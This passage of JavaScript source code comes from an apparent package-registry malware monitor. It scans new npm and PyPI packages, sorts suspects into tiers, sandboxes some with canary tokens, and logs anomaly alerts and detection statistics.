        { name: 'Package', value: `[${pkgName}](${npmLink})`, inline: true },
        { name: 'Version Change', value: `${astResult.previousVersion} \u2192 ${astResult.latestVersion}`, inline: true },
        { name: 'Severity', value: severity, inline: true },
        { name: 'New Dangerous APIs', value: changeLines || 'None', inline: false },
        { name: 'Published', value: astResult.metadata.latestPublishedAt || 'unknown', inline: true },
        { name: 'Action', value: 'DO NOT UPDATE \u2014 Compare sources: npm diff pkg@old pkg@new', inline: false }
      ],
      footer: {
        text: `MUAD'DIB Temporal AST Analysis | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };
}

async function tryTemporalAstAlert(astResult, _options) {
  // STRICT FILTER: AST anomalies are NEVER sent as webhooks — too noisy.
  // Logged to journalctl only. IOC match, sandbox, and canary exfil are the only webhook triggers.
  if (!isAstAnomalyCombined(astResult)) {
    const patterns = (astResult.findings || []).map(f => f.pattern).join(', ');
    console.log(`[MONITOR] ANOMALY (isolated AST, no webhook): ${astResult.packageName} — ${patterns}`);
  } else {
    console.log(`[MONITOR] ANOMALY (combined AST, logged only): ${astResult.packageName}`);
  }
}

async function runTemporalAstCheck(packageName) {
  if (!isTemporalAstEnabled()) return null;
  try {
    const result = await detectSuddenAstChanges(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        return `${f.pattern} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] AST ANOMALY: ${packageName} v${result.previousVersion} → v${result.latestVersion}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        temporalAst: true,
        findings: result.findings.map(f => ({
          rule: f.severity === 'CRITICAL' ? 'MUADDIB-TEMPORAL-AST-001'
            : f.severity === 'HIGH' ? 'MUADDIB-TEMPORAL-AST-002'
            : 'MUADDIB-TEMPORAL-AST-003',
          severity: f.severity,
          pattern: f.pattern
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporalAst: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Temporal AST analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

function isTemporalPublishEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function buildPublishAnomalyWebhookEmbed(publishResult) {
  const anomalies = publishResult.anomalies || [];
  const topAnomaly = anomalies[0] || {};
  const severity = topAnomaly.severity || 'HIGH';
  const color = severity === 'CRITICAL' ? 0xe74c3c : severity === 'HIGH' ? 0xe67e22 : 0xf1c40f;
  const emoji = severity === 'CRITICAL' ? '\uD83D\uDD34' : severity === 'HIGH' ? '\uD83D\uDFE0' : '\uD83D\uDFE1';

  const anomalyLines = anomalies.map(a => {
    return `**${a.type}** — ${a.severity}: ${a.description}`;
  }).join('\n');

  const pkgName = publishResult.packageName;
  const npmLink = `https://www.npmjs.com/package/${pkgName}`;

  return {
    embeds: [{
      title: `${emoji} PUBLISH ANOMALY \u2014 ${severity}`,
      color: color,
      fields: [
        { name: 'Package', value: `[${pkgName}](${npmLink})`, inline: true },
        { name: 'Versions Analyzed', value: `${publishResult.versionCount || 'N/A'}`, inline: true },
        { name: 'Severity', value: severity, inline: true },
        { name: 'Anomalies Detected', value: anomalyLines || 'None', inline: false },
        { name: 'Action', value: 'Verify maintainer activity on npm/GitHub. Check changelogs for each version.', inline: false }
      ],
      footer: {
        text: `MUAD'DIB Publish Frequency Analysis | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };
}

async function tryTemporalPublishAlert(publishResult, _options) {
  // STRICT FILTER: publish anomalies (publish_burst, rapid_succession, dormant_spike)
  // are NEVER sent as webhooks — too noisy, not actionable alone.
  // Logged to journalctl only.
  console.log(`[MONITOR] ANOMALY (logged only, never webhook): publish frequency for ${publishResult.packageName}`);
}

async function runTemporalPublishCheck(packageName) {
  if (!isTemporalPublishEnabled()) return null;
  try {
    const result = await detectPublishAnomaly(packageName);
    if (result.suspicious) {
      const anomalyStr = result.anomalies.map(a => {
        return `${a.type} (${a.severity})`;
      }).join(', ');
      console.log(`[MONITOR] PUBLISH ANOMALY: ${packageName}: ${anomalyStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        temporalPublish: true,
        findings: result.anomalies.map(a => ({
          rule: a.type === 'publish_burst' ? 'MUADDIB-PUBLISH-001'
            : a.type === 'dormant_spike' ? 'MUADDIB-PUBLISH-002'
            : 'MUADDIB-PUBLISH-003',
          severity: a.severity,
          type: a.type
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        findingsCount: result.anomalies.length,
        temporalPublish: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Publish frequency analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

function isTemporalMaintainerEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function buildMaintainerChangeWebhookEmbed(maintainerResult) {
  const findings = maintainerResult.findings || [];
  const topFinding = findings[0] || {};
  const severity = topFinding.severity || 'HIGH';
  const color = severity === 'CRITICAL' ? 0xe74c3c : severity === 'HIGH' ? 0xe67e22 : 0xf1c40f;
  const emoji = severity === 'CRITICAL' ? '\uD83D\uDD34' : severity === 'HIGH' ? '\uD83D\uDFE0' : '\uD83D\uDFE1';

  const findingLines = findings.map(f => {
    let detail = `**${f.type}** — ${f.severity}: ${f.description}`;
    if (f.riskAssessment && f.riskAssessment.reasons.length > 0) {
      detail += `\nRisk: ${f.riskAssessment.reasons.join(', ')}`;
    }
    return detail;
  }).join('\n');

  const pkgName = maintainerResult.packageName;
  const npmLink = `https://www.npmjs.com/package/${pkgName}`;

  return {
    embeds: [{
      title: `${emoji} MAINTAINER CHANGE \u2014 ${severity}`,
      color: color,
      fields: [
        { name: 'Package', value: `[${pkgName}](${npmLink})`, inline: true },
        { name: 'Severity', value: severity, inline: true },
        { name: 'Findings', value: findingLines || 'None', inline: false },
        { name: 'Action', value: 'Verify legitimacy before installing', inline: false }
      ],
      footer: {
        text: `MUAD'DIB Maintainer Change Analysis | ${new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC')}`
      },
      timestamp: new Date().toISOString()
    }]
  };
}

async function tryTemporalMaintainerAlert(maintainerResult, _options) {
  // STRICT FILTER: maintainer changes (new_publisher, suspicious_maintainer)
  // are NEVER sent as webhooks — too noisy, not actionable alone.
  // Logged to journalctl only.
  console.log(`[MONITOR] ANOMALY (logged only, never webhook): maintainer change for ${maintainerResult.packageName}`);
}

async function runTemporalMaintainerCheck(packageName) {
  if (!isTemporalMaintainerEnabled()) return null;
  try {
    const result = await detectMaintainerChange(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        return `${f.type} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] MAINTAINER CHANGE: ${packageName}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        temporalMaintainer: true,
        findings: result.findings.map(f => ({
          rule: f.type === 'new_maintainer' ? 'MUADDIB-MAINTAINER-001'
            : f.type === 'suspicious_maintainer' ? 'MUADDIB-MAINTAINER-002'
            : f.type === 'sole_maintainer_change' ? 'MUADDIB-MAINTAINER-003'
            : 'MUADDIB-MAINTAINER-004',
          severity: f.severity,
          type: f.type
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporalMaintainer: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Maintainer change analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

async function runTemporalCheck(packageName) {
  if (!isTemporalEnabled()) return null;
  try {
    const result = await detectSuddenLifecycleChange(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        const action = f.type === 'lifecycle_added' ? 'added' : 'modified';
        return `${f.script} ${action} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] TEMPORAL ANOMALY: ${packageName} v${result.previousVersion} → v${result.latestVersion}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        temporal: true,
        findings: result.findings.map(f => ({
          rule: f.type === 'lifecycle_added' ? 'MUADDIB-TEMPORAL-001' : 'MUADDIB-TEMPORAL-003',
          severity: f.severity,
          script: f.script
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporal: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Temporal analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

// --- State persistence ---

function loadState() {
  try {
    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    const state = JSON.parse(raw);
    // Restore daily report date so it survives restarts (auto-update, crashes)
    if (typeof state.lastDailyReportDate === 'string') {
      stats.lastDailyReportDate = state.lastDailyReportDate;
    }
    // Also check the dedicated daily report file (crash-safe source of truth)
    const diskDate = loadLastDailyReportDate();
    if (diskDate && (!stats.lastDailyReportDate || diskDate > stats.lastDailyReportDate)) {
      stats.lastDailyReportDate = diskDate;
    }
    return {
      npmLastPackage: typeof state.npmLastPackage === 'string' ? state.npmLastPackage : '',
      pypiLastPackage: typeof state.pypiLastPackage === 'string' ? state.pypiLastPackage : ''
    };
  } catch {
    return { npmLastPackage: '', pypiLastPackage: '' };
  }
}

function saveState(state) {
  try {
    const dir = path.dirname(STATE_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    // Persist daily report date so it survives restarts
    const persistedState = {
      ...state,
      lastDailyReportDate: stats.lastDailyReportDate
    };
    // Atomic write: write to .tmp then rename (crash-safe)
    const tmpFile = STATE_FILE + '.tmp';
    fs.writeFileSync(tmpFile, JSON.stringify(persistedState, null, 2), 'utf8');
    fs.renameSync(tmpFile, STATE_FILE);
  } catch (err) {
    console.error(`[MONITOR] Failed to save state: ${err.message}`);
  }
}

// --- HTTP helpers ---

function httpsGet(url, timeoutMs = 30_000) {
  return new Promise((resolve, reject) => {
    const req = https.get(url, { timeout: timeoutMs }, (res) => {
      if (res.statusCode === 301 || res.statusCode === 302) {
        res.resume();
        const location = res.headers.location;
        if (!location) return reject(new Error(`Redirect without Location for ${url}`));
        return httpsGet(location, timeoutMs).then(resolve, reject);
      }
      if (res.statusCode < 200 || res.statusCode >= 300) {
        res.resume();
        return reject(new Error(`HTTP ${res.statusCode} for ${url}`));
      }
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
      res.on('error', reject);
    });
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error(`Timeout for ${url}`));
    });
  });
}

async function getWeeklyDownloads(packageName) {
  const cached = downloadsCache.get(packageName);
  if (cached && (Date.now() - cached.fetchedAt) < DOWNLOADS_CACHE_TTL) {
    return cached.downloads;
  }
  try {
    const url = `https://api.npmjs.org/downloads/point/last-week/${encodeURIComponent(packageName)}`;
    const body = await httpsGet(url, 3000);
    const data = JSON.parse(body);
    const downloads = typeof data.downloads === 'number' ? data.downloads : -1;
    downloadsCache.set(packageName, { downloads, fetchedAt: Date.now() });
    return downloads;
  } catch {
    return -1;
  }
}

// --- Tarball URL helpers ---

function getNpmTarballUrl(pkgData) {
  return (pkgData.dist && pkgData.dist.tarball) || null;
}

async function getPyPITarballUrl(packageName) {
  const url = `https://pypi.org/pypi/${encodeURIComponent(packageName)}/json`;
  const body = await httpsGet(url);
  let data;
  try {
    data = JSON.parse(body);
  } catch (e) {
    throw new Error(`Invalid JSON from PyPI for ${packageName}: ${e.message}`);
  }
  const version = (data.info && data.info.version) || '';
  const urls = data.urls || [];
  // Prefer sdist (.tar.gz)
  const sdist = urls.find(u => u.packagetype === 'sdist' && u.url);
  if (sdist) return { url: sdist.url, version };
  // Fallback: any .tar.gz
  const tarGz = urls.find(u => u.url && u.url.endsWith('.tar.gz'));
  if (tarGz) return { url: tarGz.url, version };
  // Fallback: first available file
  if (urls.length > 0 && urls[0].url) return { url: urls[0].url, version };
  return { url: null, version };
}

// --- Alerts persistence ---

function appendAlert(alert) {
  try {
    const dir = path.dirname(ALERTS_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    let alerts = [];
    try {
      alerts = JSON.parse(fs.readFileSync(ALERTS_FILE, 'utf8'));
    } catch {}
    alerts.push(alert);
    atomicWriteFileSync(ALERTS_FILE, JSON.stringify(alerts, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to save alert: ${err.message}`);
  }
}

// --- Detection time logging ---

function loadDetections() {
  try {
    const raw = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    const data = JSON.parse(raw);
    if (data && Array.isArray(data.detections)) return data;
    return { detections: [] };
  } catch {
    return { detections: [] };
  }
}

function appendDetection(name, version, ecosystem, findings, severity) {
  try {
    const dir = path.dirname(DETECTIONS_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const data = loadDetections();
    const key = `${name}@${version}`;
    if (data.detections.some(d => `${d.package}@${d.version}` === key)) {
      return; // dedup
    }
    data.detections.push({
      package: name,
      version,
      ecosystem,
      first_seen_at: new Date().toISOString(),
      findings,
      severity,
      advisory_at: null,
      lead_time_hours: null
    });
    atomicWriteFileSync(DETECTIONS_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to save detection: ${err.message}`);
  }
}

function getDetectionStats() {
  const data = loadDetections();
  const detections = data.detections;
  const total = detections.length;

  const bySeverity = {};
  const byEcosystem = {};
  for (const d of detections) {
    bySeverity[d.severity] = (bySeverity[d.severity] || 0) + 1;
    byEcosystem[d.ecosystem] = (byEcosystem[d.ecosystem] || 0) + 1;
  }

  const withLeadTime = detections.filter(d => d.advisory_at && d.lead_time_hours != null);
  let leadTime = null;
  if (withLeadTime.length > 0) {
    const hours = withLeadTime.map(d => d.lead_time_hours);
    leadTime = {
      count: withLeadTime.length,
      avg: hours.reduce((a, b) => a + b, 0) / hours.length,
      min: Math.min(...hours),
      max: Math.max(...hours)
    };
  }

  return { total, bySeverity, byEcosystem, leadTime };
}

// --- Scan stats (FP rate tracking) ---

function loadScanStats() {
  try {
    const raw = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    const data = JSON.parse(raw);
    if (data && data.stats && Array.isArray(data.daily)) return data;
    return { stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] };
  } catch {
    return { stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] };
  }
}

function updateScanStats(result) {
  const data = loadScanStats();
  data.stats.total_scanned++;

  if (result === 'clean') data.stats.clean++;
  else if (result === 'suspect') data.stats.suspect++;
  else if (result === 'false_positive') data.stats.false_positive++;
  else if (result === 'confirmed') data.stats.confirmed_malicious++;

  const today = new Date().toISOString().slice(0, 10);
  let dayEntry = data.daily.find(d => d.date === today);
  if (!dayEntry) {
    dayEntry = { date: today, scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed: 0, fp_rate: 0 };
    data.daily.push(dayEntry);
  }
  dayEntry.scanned++;

  if (result === 'clean') dayEntry.clean++;
  else if (result === 'suspect') dayEntry.suspect++;
  else if (result === 'false_positive') dayEntry.false_positive++;
  else if (result === 'confirmed') dayEntry.confirmed++;

  const denom = dayEntry.false_positive + dayEntry.confirmed;
  dayEntry.fp_rate = denom > 0 ? dayEntry.false_positive / denom : 0;

  try {
    atomicWriteFileSync(SCAN_STATS_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to save scan stats: ${err.message}`);
  }
}

// --- Daily stats persistence (survives restarts) ---

function loadDailyStats() {
  try {
    const raw = fs.readFileSync(DAILY_STATS_FILE, 'utf8');
    const data = JSON.parse(raw);
    if (data && typeof data.scanned === 'number') {
      stats.scanned = data.scanned;
      stats.clean = data.clean || 0;
      stats.suspect = data.suspect || 0;
      if (data.suspectByTier) {
        stats.suspectByTier.t1 = data.suspectByTier.t1 || 0;
        stats.suspectByTier.t2 = data.suspectByTier.t2 || 0;
        stats.suspectByTier.t3 = data.suspectByTier.t3 || 0;
      }
      stats.errors = data.errors || 0;
      if (data.errorsByType) {
        stats.errorsByType.too_large = data.errorsByType.too_large || 0;
        stats.errorsByType.tar_failed = data.errorsByType.tar_failed || 0;
        stats.errorsByType.http_error = data.errorsByType.http_error || 0;
        stats.errorsByType.timeout = data.errorsByType.timeout || 0;
        stats.errorsByType.other = data.errorsByType.other || 0;
      }
      stats.totalTimeMs = data.totalTimeMs || 0;
      if (Array.isArray(data.dailyAlerts)) {
        dailyAlerts.length = 0;
        dailyAlerts.push(...data.dailyAlerts);
      }
      console.log(`[MONITOR] Restored daily stats: ${stats.scanned} scanned, ${stats.clean} clean, ${stats.suspect} suspect`);
    }
  } catch {
    // No file or corrupt — start from zero
  }
}

function saveDailyStats() {
  try {
    const dir = path.dirname(DAILY_STATS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const data = {
      scanned: stats.scanned,
      clean: stats.clean,
      suspect: stats.suspect,
      suspectByTier: { ...stats.suspectByTier },
      errors: stats.errors,
      errorsByType: { ...stats.errorsByType },
      totalTimeMs: stats.totalTimeMs,
      dailyAlerts: dailyAlerts.slice()
    };
    atomicWriteFileSync(DAILY_STATS_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to save daily stats: ${err.message}`);
  }
}

function resetDailyStats() {
  try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
}

/**
 * Persist daily stats to disk every DAILY_STATS_PERSIST_INTERVAL scans.
 * Called after each scan completes in processQueue.
 */
function maybePersistDailyStats() {
  scansSinceLastPersist++;
  if (scansSinceLastPersist >= DAILY_STATS_PERSIST_INTERVAL) {
    saveDailyStats();
    scansSinceLastPersist = 0;
  }
}

// --- Bundled tooling false-positive filter ---

const KNOWN_BUNDLED_FILES = ['yarn.js', 'webpack.js', 'terser.js', 'esbuild.js', 'polyfills.js'];
const KNOWN_BUNDLED_PATHS = ['_next/static/chunks/', '.next/static/chunks/'];

function isBundledToolingOnly(threats) {
  if (threats.length === 0) return false;
  return threats.every(t => {
    if (!t.file) return false;
    const basename = path.basename(t.file);
    if (KNOWN_BUNDLED_FILES.includes(basename)) return true;
    const normalized = t.file.replace(/\\/g, '/');
    return KNOWN_BUNDLED_PATHS.some(p => normalized.includes(p));
  });
}

// --- Package scanning ---

async function scanPackage(name, version, ecosystem, tarballUrl) {
  const startTime = Date.now();
  const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
  if (!fs.existsSync(tmpBase)) fs.mkdirSync(tmpBase, { recursive: true });
  const tmpDir = fs.mkdtempSync(path.join(tmpBase, `${sanitizePackageName(name)}-`));

  try {
    const tgzPath = path.join(tmpDir, 'package.tar.gz');
    await downloadToFile(tarballUrl, tgzPath);

    // Check downloaded size
    const fileSize = fs.statSync(tgzPath).size;
    if (fileSize > MAX_TARBALL_SIZE) {
      console.log(`[MONITOR] SKIP: ${name}@${version} — tarball too large (${(fileSize / 1024 / 1024).toFixed(1)}MB)`);
      stats.scanned++;
      return;
    }

    const extractedDir = extractTarGz(tgzPath, tmpDir);
    const result = await run(extractedDir, { _capture: true });

    if (result.summary.total === 0) {
      stats.scanned++;
      const elapsed = Date.now() - startTime;
      stats.totalTimeMs += elapsed;
      stats.clean++;
      console.log(`[MONITOR] CLEAN: ${name}@${version} (0 findings, ${(elapsed / 1000).toFixed(1)}s)`);
      updateScanStats('clean');
      return { sandboxResult: null, staticClean: true };
    } else {
      const counts = [];
      if (result.summary.critical > 0) counts.push(`${result.summary.critical} CRITICAL`);
      if (result.summary.high > 0) counts.push(`${result.summary.high} HIGH`);
      if (result.summary.medium > 0) counts.push(`${result.summary.medium} MEDIUM`);
      if (result.summary.low > 0) counts.push(`${result.summary.low} LOW`);

      // Check if all findings come from bundled tooling files
      if (isBundledToolingOnly(result.threats)) {
        stats.scanned++;
        const elapsed = Date.now() - startTime;
        stats.totalTimeMs += elapsed;
        stats.clean++;
        console.log(`[MONITOR] SKIPPED (bundled tooling): ${name}@${version} (${counts.join(', ')})`);

        const alert = {
          timestamp: new Date().toISOString(),
          name,
          version,
          ecosystem,
          skipped: true,
          // P7: Exclude LOW-severity findings from alert persistence
          findings: result.threats
            .filter(t => t.severity !== 'LOW')
            .map(t => ({
              rule: t.rule_id || t.type,
              severity: t.severity,
              file: t.file
            })),
          lowCount: result.threats.filter(t => t.severity === 'LOW').length
        };
        appendAlert(alert);
        updateScanStats('clean');
        return { sandboxResult: null, staticClean: true };
      } else {
        // Popularity pre-filter: skip sandbox for popular npm packages with only MEDIUM/LOW
        if (ecosystem === 'npm' && !hasIOCMatch(result) && !hasTyposquat(result) && !hasHighOrCritical(result)) {
          const downloads = await getWeeklyDownloads(name);
          if (downloads >= POPULAR_THRESHOLD) {
            stats.scanned++;
            const elapsed = Date.now() - startTime;
            stats.totalTimeMs += elapsed;
            stats.clean++;
            console.log(`[MONITOR] TRUSTED (popular): ${name}@${version} (${Math.round(downloads / 1000)}k downloads/week, ${counts.join(', ')})`);
            updateScanStats('clean');
            return { sandboxResult: null, staticClean: true };
          }
        }

        const classification = isSuspectClassification(result);
        if (!classification.suspect) {
          stats.scanned++;
          const elapsed = Date.now() - startTime;
          stats.totalTimeMs += elapsed;
          stats.clean++;
          console.log(`[MONITOR] CLEAN (low-signal): ${name}@${version} (${counts.join(', ')})`);
          updateScanStats('clean');
          return { sandboxResult: null, staticClean: true };
        }

        const tier = classification.tier;

        // Tier 3: logged only, no stats.suspect increment, no sandbox
        if (tier === 3) {
          stats.scanned++;
          const elapsed = Date.now() - startTime;
          stats.totalTimeMs += elapsed;
          stats.suspectByTier.t3++;
          console.log(`[MONITOR] SUSPECT T3 (low-intent): ${name}@${version} (${counts.join(', ')})`);
          console.log(`[MONITOR] FINDINGS: ${name}@${version} → ${formatFindings(result)}`);
          updateScanStats('clean'); // T3 does not inflate suspect stats
          return { sandboxResult: null, staticClean: true, tier: 3 };
        }

        // Tier 1 and Tier 2: count as suspect
        stats.suspect++;
        stats.suspectByTier[tier === 1 ? 't1' : 't2']++;
        const tierLabel = tier === 1 ? 'T1' : 'T2';
        console.log(`[MONITOR] SUSPECT ${tierLabel}: ${name}@${version} (${counts.join(', ')})`);
        console.log(`[MONITOR] FINDINGS: ${name}@${version} → ${formatFindings(result)}`);

        // Sandbox decision based on tier
        let sandboxResult = null;
        const shouldSandbox = isSandboxEnabled() && sandboxAvailable && (
          tier === 1 ||
          (tier === 2 && scanQueue.length < 50)
        );

        if (shouldSandbox) {
          try {
            const canary = isCanaryEnabled();
            const reason = tier === 2 ? ' (T2, queue low)' : '';
            console.log(`[MONITOR] SANDBOX${reason}: launching for ${name}@${version}${canary ? ' (canary: on)' : ''}...`);
            sandboxResult = await runSandbox(name, { canary });
            console.log(`[MONITOR] SANDBOX: ${name}@${version} → score: ${sandboxResult.score}, severity: ${sandboxResult.severity}`);

            // Check for canary exfiltration findings and send dedicated alert
            const canaryFindings = (sandboxResult.findings || []).filter(f => f.type === 'canary_exfiltration');
            if (canaryFindings.length > 0) {
              console.log(`[MONITOR] CANARY EXFILTRATION: ${name}@${version} — ${canaryFindings.length} token(s) stolen!`);
              // Dedup: skip if this package was already alerted with canary_exfiltration
              const canaryRuleId = 'canary_exfiltration';
              const previousRules = alertedPackageRules.get(name);
              const alreadyAlerted = previousRules && previousRules.has(canaryRuleId);
              if (alreadyAlerted) {
                console.log(`[MONITOR] DEDUP: ${name} canary exfiltration (already alerted today)`);
              } else {
                const url = getWebhookUrl();
                if (url) {
                  const exfiltrations = canaryFindings.map(f => ({
                    token: f.detail.match(/exfiltrate (\S+)/)?.[1] || 'UNKNOWN',
                    foundIn: f.detail
                  }));
                  const payload = buildCanaryExfiltrationWebhookEmbed(name, version, exfiltrations);
                  try {
                    await sendWebhook(url, payload, { rawPayload: true });
                    console.log(`[MONITOR] Canary exfiltration webhook sent for ${name}@${version}`);
                    // Track in dedup map
                    if (previousRules) {
                      previousRules.add(canaryRuleId);
                    } else {
                      alertedPackageRules.set(name, new Set([canaryRuleId]));
                    }
                  } catch (webhookErr) {
                    console.error(`[MONITOR] Canary webhook failed for ${name}@${version}: ${webhookErr.message}`);
                  }
                }
              }
            }
          } catch (err) {
            console.error(`[MONITOR] SANDBOX error for ${name}@${version}: ${err.message}`);
          }
        } else if (tier === 2) {
          console.log(`[MONITOR] SANDBOX SKIPPED (T2, queue ${scanQueue.length} >= 50): ${name}@${version}`);
        }

        stats.scanned++;
        const elapsed = Date.now() - startTime;
        stats.totalTimeMs += elapsed;
        console.log(`[MONITOR] ${name}@${version} total time: ${(elapsed / 1000).toFixed(1)}s`);

        const alert = {
          timestamp: new Date().toISOString(),
          name,
          version,
          ecosystem,
          tier,
          // P7: Exclude LOW-severity findings from alert persistence.
          // LOW findings are FP-reduced noise (bundler artifacts, config loaders, SDK patterns).
          // Storing them inflates monitor-alerts.json and obscures real threats.
          findings: result.threats
            .filter(t => t.severity !== 'LOW')
            .map(t => ({
              rule: t.rule_id || t.type,
              severity: t.severity,
              file: t.file
            })),
          lowCount: result.threats.filter(t => t.severity === 'LOW').length
        };

        if (sandboxResult && sandboxResult.score > 0) {
          alert.sandbox = {
            score: sandboxResult.score,
            severity: sandboxResult.severity,
            findings: sandboxResult.findings
          };
        }

        if (sandboxResult && sandboxResult.score === 0 && (result.summary.riskScore || 0) >= 20) {
          alert.dormant_suspect = true;
        }

        appendAlert(alert);

        const findingTypes = [...new Set(result.threats.map(t => t.type))];
        const maxSeverity = result.summary.critical > 0 ? 'CRITICAL'
          : result.summary.high > 0 ? 'HIGH'
          : result.summary.medium > 0 ? 'MEDIUM' : 'LOW';
        appendDetection(name, version, ecosystem, findingTypes, maxSeverity);

        dailyAlerts.push({ name, version, ecosystem, findingsCount: result.summary.total, tier });
        // Persist alert locally for ALL suspects (independent of webhook filtering)
        const alertData = buildAlertData(name, version, ecosystem, result, sandboxResult);
        persistAlert(name, version, ecosystem, alertData);

        // Reputation scoring (monitor-only, npm only)
        // Adjusts score for webhook decision without mutating persisted alert data.
        let adjustedResult = result;
        if (ecosystem === 'npm') {
          try {
            const { getPackageMetadata } = require('./scanner/npm-registry.js');
            const metadata = await getPackageMetadata(name);
            const reputationFactor = computeReputationFactor(metadata);
            if (reputationFactor !== 1.0) {
              const originalScore = result.summary.riskScore || 0;
              const adjustedScore = Math.round(originalScore * reputationFactor);
              adjustedResult = {
                ...result,
                summary: { ...result.summary, riskScore: adjustedScore, reputationFactor }
              };
              console.log(`[MONITOR] REPUTATION: ${name} factor=${reputationFactor.toFixed(2)} (${originalScore} → ${adjustedScore})`);
            }
          } catch (err) {
            console.error(`[MONITOR] Reputation error for ${name}: ${err.message}`);
          }
        }
        await trySendWebhook(name, version, ecosystem, adjustedResult, sandboxResult);
        const staticScore = result.summary.riskScore || 0;
        return { sandboxResult, staticClean: false, tier, staticScore };
      }
    }
  } catch (err) {
    recordError(err);
    stats.scanned++;
    stats.totalTimeMs += Date.now() - startTime;
    console.error(`[MONITOR] ERROR scanning ${name}@${version}: ${err.message}`);
    return { sandboxResult: null, staticClean: false };
  } finally {
    // Cleanup temp dir
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  }
}

function timeoutPromise(ms) {
  return new Promise((_, reject) => {
    setTimeout(() => reject(new Error(`Scan timeout after ${ms / 1000}s`)), ms);
  });
}

async function processQueue() {
  while (scanQueue.length > 0) {
    const item = scanQueue.shift();
    try {
      await Promise.race([
        resolveTarballAndScan(item),
        timeoutPromise(SCAN_TIMEOUT_MS)
      ]);
    } catch (err) {
      recordError(err);
      console.error(`[MONITOR] Queue error for ${item.name}: ${err.message}`);
    }
    maybePersistDailyStats();

    // Check daily report between each package scan (not just between poll cycles).
    // Without this, a queue of 50 packages × 3min/each = 150min delay on the report.
    if (isDailyReportDue()) {
      await sendDailyReport();
    }
  }
}

// --- Stats reporting ---

function reportStats() {
  const avg = stats.scanned > 0 ? (stats.totalTimeMs / stats.scanned / 1000).toFixed(1) : '0.0';
  const { t1, t2, t3 } = stats.suspectByTier;
  console.log(`[MONITOR] Stats: ${stats.scanned} scanned, ${stats.clean} clean, ${stats.suspect} suspect (T1:${t1} T2:${t2} T3:${t3}), ${stats.errors} error${stats.errors !== 1 ? 's' : ''}, avg ${avg}s/pkg`);
  stats.lastReportTime = Date.now();
}

const DAILY_REPORT_HOUR = 8; // 08:00 Paris time (Europe/Paris)

/**
 * Load the date (YYYY-MM-DD) of the last daily report sent from disk.
 * Returns null if no file exists or file is invalid.
 */
function loadLastDailyReportDate() {
  try {
    const raw = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8');
    const data = JSON.parse(raw);
